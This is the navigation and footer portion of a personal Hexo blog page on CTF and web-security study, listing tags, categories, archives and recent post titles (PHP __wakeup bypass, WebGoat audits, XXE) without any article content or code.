      <a data-url="http://yoursite.com/2019/12/25/wakeup%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87/" data-id="ckemqkebf0025astyemyie9c4" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/WEB/" rel="tag">WEB</a></li></ul>

    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/5/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/7/">Next &amp;raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/WEB/">WEB</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/WEB%EF%BC%8Cpython/">WEB，python</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%8Cweb/">攻防世界，web</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Jarvis-OJ/" rel="tag">Jarvis OJ</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WEB/" rel="tag">WEB</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WEB%EF%BC%8Cphp/" rel="tag">WEB，php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WEB%EF%BC%8Cupload/" rel="tag">WEB，upload</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/buuctf/" rel="tag">buuctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%EF%BC%8CJARvis-OJ/" rel="tag">web，JARvis OJ</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/Jarvis-OJ/" style="font-size: 13.33px;">Jarvis OJ</a> <a href="/tags/PHP/" style="font-size: 13.33px;">PHP</a> <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 13.33px;">SQL注入</a> <a href="/tags/WEB/" style="font-size: 20px;">WEB</a> <a href="/tags/WEB%EF%BC%8Cphp/" style="font-size: 10px;">WEB，php</a> <a href="/tags/WEB%EF%BC%8Cupload/" style="font-size: 13.33px;">WEB，upload</a> <a href="/tags/buuctf/" style="font-size: 10px;">buuctf</a> <a href="/tags/pwn/" style="font-size: 16.67px;">pwn</a> <a href="/tags/web%EF%BC%8CJARvis-OJ/" style="font-size: 10px;">web，JARvis OJ</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">八月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">七月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">六月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">五月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">四月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">三月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">二月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">一月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">十二月 2019</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/08/11/%5BMRCTF2020%5DEzpop_Reveng/">(no title)</a>
          </li>
        
          <li>
            <a href="/2020/08/07/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%88%E4%B8%89%EF%BC%89XXE/">(no title)</a>
          </li>
        
          <li>
            <a href="/2020/08/07/Java%E5%8F%8D%E5%B0%84%E7%9A%84%E5%AD%A6%E4%B9%A0/">(no title)</a>
          </li>
        
          <li>
            <a href="/2020/08/01/Webgoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%88%E4%BA%8C%EF%BC%89/">(no title)</a>
          </li>
        
          <li>
            <a href="/2020/07/31/Webgoat8%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%88%E4%B8%80%EF%BC%89/">(no title)</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 小叹<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>